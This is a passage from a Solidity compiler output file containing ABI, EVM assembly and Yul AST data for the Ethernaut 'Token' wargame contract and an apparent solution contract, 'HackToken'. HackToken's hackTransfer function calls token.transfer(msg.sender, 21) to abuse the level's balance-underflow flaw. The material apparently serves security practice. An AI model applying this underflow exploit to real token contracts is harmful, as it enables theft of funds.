					"metadata": "{\"compiler\":{\"version\":\"0.8.1+commit.df193b15\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_initialSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ethernautToken.sol\":\"Token\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/ethernautToken.sol\":{\"keccak256\":\"0xc3ea9d87433a6f773c98fa4e31f92711c9ebedfaf29b9c7361181d22a913f1c5\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://afc3172ec0ff8a08128870124a662ba2fcdf262a614db41f2efcf83e6aceca94\",\"dweb:/ipfs/QmSukdAcBLgbsTCr4DzgAvyHAdz87fNCpNkrzVmeoVimvj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 5,
								"contract": "contracts/ethernautToken.sol:Token",
								"label": "balances",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 7,
								"contract": "contracts/ethernautToken.sol:Token",
								"label": "totalSupply",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/ethernautTokenHack.sol": {
				"HackToken": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_token",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "hackTransfer",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token",
							"outputs": [
								{
									"internalType": "contract Token",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/ethernautTokenHack.sol\":102:396  contract HackToken{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/ethernautTokenHack.sol\":152:225  constructor(address _token)public{\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/ethernautTokenHack.sol\":210:216  _token */\n  dup1\n    /* \"contracts/ethernautTokenHack.sol\":196:201  token */\n  0x00\n  dup1\n    /* \"contracts/ethernautTokenHack.sol\":196:217  token = Token(_token) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/ethernautTokenHack.sol\":152:225  constructor(address _token)public{\r... */\n  pop\n    /* \"contracts/ethernautTokenHack.sol\":102:396  contract HackToken{\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:542   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:536   */\n  tag_17\n    /* \"#utility.yul\":530:535   */\n  dup3\n    /* \"#utility.yul\":512:536   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":501:536   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:542   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":548:674   */\ntag_18:\n  0x00\n    /* \"#utility.yul\":625:667   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":618:623   */\n  dup3\n    /* \"#utility.yul\":614:668   */\n  and\n    /* \"#utility.yul\":603:668   */\n  swap1\n  pop\n    /* \"#utility.yul\":593:674   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":680:802   */\ntag_11:\n    /* \"#utility.yul\":753:777   */\n  tag_21\n    /* \"#utility.yul\":771:776   */\n  dup2\n    /* \"#utility.yul\":753:777   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":746:751   */\n  dup2\n    /* \"#utility.yul\":743:778   */\n  eq\n    /* \"#utility.yul\":733:735   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":792:793   */\n  0x00\n    /* \"#utility.yul\":789:790   */\n  dup1\n    /* \"#utility.yul\":782:794   */\n  revert\n    /* \"#utility.yul\":733:735   */\ntag_22:\n    /* \"#utility.yul\":723:802   */\n  pop\n  jump\t// out\n    /* \"contracts/ethernautTokenHack.sol\":102:396  contract HackToken{\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/ethernautTokenHack.sol\":102:396  contract HackToken{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1191c087\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfc0c546a\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/ethernautTokenHack.sol\":233:391  function hackTransfer() public {\r... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"contracts/ethernautTokenHack.sol\":127:145  Token public token */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ethernautTokenHack.sol\":233:391  function hackTransfer() public {\r... */\n    tag_6:\n        /* \"contracts/ethernautTokenHack.sol\":275:291  address _address */\n      0x00\n        /* \"contracts/ethernautTokenHack.sol\":294:304  msg.sender */\n      caller\n        /* \"contracts/ethernautTokenHack.sol\":275:304  address _address = msg.sender */\n      swap1\n      pop\n        /* \"contracts/ethernautTokenHack.sol\":315:329  uint256 _value */\n      0x00\n        /* \"contracts/ethernautTokenHack.sol\":332:338  20 + 1 */\n      0x15\n        /* \"contracts/ethernautTokenHack.sol\":315:338  uint256 _value = 20 + 1 */\n      swap1\n      pop\n        /* \"contracts/ethernautTokenHack.sol\":351:356  token */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ethernautTokenHack.sol\":351:365  token.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"contracts/ethernautTokenHack.sol\":366:374  _address */\n      dup4\n        /* \"contracts/ethernautTokenHack.sol\":376:382  _value */\n      dup4\n        /* \"contracts/ethernautTokenHack.sol\":351:383  token.transfer(_address, _value) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      pop\n        /* \"contracts/ethernautTokenHack.sol\":233:391  function hackTransfer() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/ethernautTokenHack.sol\":127:145  Token public token */\n    tag_8:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_22\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_23\n      jump\t// in\n    tag_22:\n        /* \"#utility.yul\":67:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:428   */\n    tag_18:\n      0x00\n        /* \"#utility.yul\":266:268   */\n      0x20\n        /* \"#utility.yul\":254:263   */\n      dup3\n        /* \"#utility.yul\":245:252   */\n      dup5\n        /* \"#utility.yul\":241:264   */\n      sub\n        /* \"#utility.yul\":237:269   */\n      slt\n        /* \"#utility.yul\":234:236   */\n      iszero\n      tag_25\n      jumpi\n        /* \"#utility.yul\":282:283   */\n      0x00\n        /* \"#utility.yul\":279:280   */\n      dup1\n        /* \"#utility.yul\":272:284   */\n      revert\n        /* \"#utility.yul\":234:236   */\n    tag_25:\n        /* \"#utility.yul\":325:326   */\n      0x00\n        /* \"#utility.yul\":350:411   */\n      tag_26\n        /* \"#utility.yul\":403:410   */\n      dup5\n        /* \"#utility.yul\":394:400   */\n      dup3\n        /* \"#utility.yul\":383:392   */\n      dup6\n        /* \"#utility.yul\":379:401   */\n      add\n        /* \"#utility.yul\":350:411   */\n      tag_20\n      jump\t// in\n    tag_26:\n        /* \"#utility.yul\":340:411   */\n      swap2\n      pop\n        /* \"#utility.yul\":296:421   */\n      pop\n        /* \"#utility.yul\":224:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":434:552   */\n    tag_27:\n        /* \"#utility.yul\":521:545   */\n      tag_29\n        /* \"#utility.yul\":539:544   */\n      dup2\n        /* \"#utility.yul\":521:545   */\n      tag_30\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":516:519   */\n      dup3\n        /* \"#utility.yul\":509:546   */\n      mstore\n        /* \"#utility.yul\":499:552   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":558:713   */\n    tag_31:\n        /* \"#utility.yul\":657:706   */\n      tag_33\n        /* \"#utility.yul\":700:705   */\n      dup2\n        /* \"#utility.yul\":657:706   */\n      tag_34\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":652:655   */\n      dup3\n        /* \"#utility.yul\":645:707   */\n      mstore\n        /* \"#utility.yul\":635:713   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":719:837   */\n    tag_35:\n        /* \"#utility.yul\":806:830   */\n      tag_37\n        /* \"#utility.yul\":824:829   */\n      dup2\n        /* \"#utility.yul\":806:830   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":801:804   */\n      dup3\n        /* \"#utility.yul\":794:831   */\n      mstore\n        /* \"#utility.yul\":784:837   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":843:1175   */\n    tag_13:\n      0x00\n        /* \"#utility.yul\":1002:1004   */\n      0x40\n        /* \"#utility.yul\":991:1000   */\n      dup3\n        /* \"#utility.yul\":987:1005   */\n      add\n        /* \"#utility.yul\":979:1005   */\n      swap1\n      pop\n        /* \"#utility.yul\":1015:1086   */\n      tag_40\n        /* \"#utility.yul\":1083:1084   */\n      0x00\n        /* \"#utility.yul\":1072:1081   */\n      dup4\n        /* \"#utility.yul\":1068:1085   */\n      add\n        /* \"#utility.yul\":1059:1065   */\n      dup6\n        /* \"#utility.yul\":1015:1086   */\n      tag_27\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":1096:1168   */\n      tag_41\n        /* \"#utility.yul\":1164:1166   */\n      0x20\n        /* \"#utility.yul\":1153:1162   */\n      dup4\n        /* \"#utility.yul\":1149:1167   */\n      add\n        /* \"#utility.yul\":1140:1146   */\n      dup5\n        /* \"#utility.yul\":1096:1168   */\n      tag_35\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":969:1175   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1181:1427   */\n    tag_10:\n      0x00\n        /* \"#utility.yul\":1324:1326   */\n      0x20\n        /* \"#utility.yul\":1313:1322   */\n      dup3\n        /* \"#utility.yul\":1309:1327   */\n      add\n        /* \"#utility.yul\":1301:1327   */\n      swap1\n      pop\n        /* \"#utility.yul\":1337:1420   */\n      tag_43\n        /* \"#utility.yul\":1417:1418   */\n      0x00\n        /* \"#utility.yul\":1406:1415   */\n      dup4\n        /* \"#utility.yul\":1402:1419   */\n      add\n        /* \"#utility.yul\":1393:1399   */\n      dup5\n        /* \"#utility.yul\":1337:1420   */\n      tag_31\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":1291:1427   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1433:1529   */\n    tag_30:\n      0x00\n        /* \"#utility.yul\":1499:1523   */\n      tag_45\n        /* \"#utility.yul\":1517:1522   */\n      dup3\n        /* \"#utility.yul\":1499:1523   */\n      tag_46\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":1488:1523   */\n      swap1\n      pop\n        /* \"#utility.yul\":1478:1529   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1535:1625   */\n    tag_47:\n      0x00\n        /* \"#utility.yul\":1612:1617   */\n      dup2\n        /* \"#utility.yul\":1605:1618   */\n      iszero\n        /* \"#utility.yul\":1598:1619   */\n      iszero\n        /* \"#utility.yul\":1587:1619   */\n      swap1\n      pop\n        /* \"#utility.yul\":1577:1625   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1631:1757   */\n    tag_46:\n      0x00\n        /* \"#utility.yul\":1708:1750   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1701:1706   */\n      dup3\n        /* \"#utility.yul\":1697:1751   */\n      and\n        /* \"#utility.yul\":1686:1751   */\n      swap1\n      pop\n        /* \"#utility.yul\":1676:1757   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1763:1840   */\n    tag_38:\n      0x00\n        /* \"#utility.yul\":1829:1834   */\n      dup2\n        /* \"#utility.yul\":1818:1834   */\n      swap1\n      pop\n        /* \"#utility.yul\":1808:1840   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1846:1996   */\n    tag_34:\n      0x00\n        /* \"#utility.yul\":1941:1990   */\n      tag_52\n        /* \"#utility.yul\":1984:1989   */\n      dup3\n        /* \"#utility.yul\":1941:1990   */\n      tag_53\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1928:1990   */\n      swap1\n      pop\n        /* \"#utility.yul\":1918:1996   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2002:2127   */\n    tag_53:\n      0x00\n        /* \"#utility.yul\":2097:2121   */\n      tag_55\n        /* \"#utility.yul\":2115:2120   */\n      dup3\n        /* \"#utility.yul\":2097:2121   */\n      tag_46\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":2084:2121   */\n      swap1\n      pop\n        /* \"#utility.yul\":2074:2127   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2133:2249   */\n    tag_23:\n        /* \"#utility.yul\":2203:2224   */\n      tag_57\n        /* \"#utility.yul\":2218:2223   */\n      dup2\n        /* \"#utility.yul\":2203:2224   */\n      tag_47\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":2196:2201   */\n      dup2\n        /* \"#utility.yul\":2193:2225   */\n      eq\n        /* \"#utility.yul\":2183:2185   */\n      tag_58\n      jumpi\n        /* \"#utility.yul\":2239:2240   */\n      0x00\n        /* \"#utility.yul\":2236:2237   */\n      dup1\n        /* \"#utility.yul\":2229:2241   */\n      revert\n        /* \"#utility.yul\":2183:2185   */\n    tag_58:\n        /* \"#utility.yul\":2173:2249   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220baa141757f5ecfb978f508cb70f7619c7ac1a347ea0d098642829fa08bf4c46464736f6c63430008010033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:805:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "70:80:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "80:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "95:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "89:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "89:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "80:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "138:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "111:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "111:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "111:33:2"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "48:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "56:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:2",
														"type": ""
													}
												],
												"src": "7:143:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "233:207:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "279:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "288:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "291:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "281:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "281:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "281:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "254:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "263:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "250:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "250:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "275:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "246:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:32:2"
															},
															"nodeType": "YulIf",
															"src": "243:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "305:128:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "320:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "334:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "324:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "349:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "395:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "406:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "391:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "391:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "415:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "359:31:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "359:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "349:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "203:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "214:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "226:6:2",
														"type": ""
													}
												],
												"src": "156:284:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "491:51:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "501:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "530:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "512:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "512:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "501:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "473:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "483:7:2",
														"type": ""
													}
												],
												"src": "446:96:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "593:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "603:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "618:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "625:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "614:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "614:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "603:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "575:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "585:7:2",
														"type": ""
													}
												],
												"src": "548:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "723:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "780:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "789:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "792:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "782:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "782:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "782:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "746:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "771:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "753:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "753:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "743:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "743:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "736:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "736:43:2"
															},
															"nodeType": "YulIf",
															"src": "733:2:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "716:5:2",
														"type": ""
													}
												],
												"src": "680:122:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
